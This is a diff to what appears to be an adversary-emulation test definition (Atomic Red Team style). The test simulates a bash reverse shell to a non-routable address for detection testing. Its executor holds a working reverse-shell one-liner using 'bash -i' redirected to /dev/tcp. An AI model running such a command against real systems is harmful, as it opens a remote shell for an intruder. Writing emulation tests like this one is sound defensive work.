@@ -256,14 +256,6 @@ atomic_tests:
     -i flag and redirects IO to dev tcp targeting a non-routable IP address.
   supported_platforms:
   - linux
-  dependency_executor_name: bash
-  dependencies:
-  - description: |
-      bash must be installed
-    prereq_command: |
-      which bash
-    get_prereq_command: |
-      echo "bash is required"
   input_arguments:
     target_host:
       description: IP address for the reverse shell connection attempt
@@ -273,9 +265,17 @@ atomic_tests:
       description: Port for the reverse shell connection attempt
       type: string
       default: "4444"
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Bash must be installed
+    prereq_command: |
+      which bash
+    get_prereq_command: |
+      apt-get install -y bash || yum install -y bash
   executor:
     command: |
-      bash -c 'timeout 5 bash -i >& /dev/tcp/#{target_host}/#{target_port} 0>&1 || true'
+      timeout 5 bash -i >& /dev/tcp/#{target_host}/#{target_port} 0>&1 || true
     cleanup_command: |
       true
     name: bash
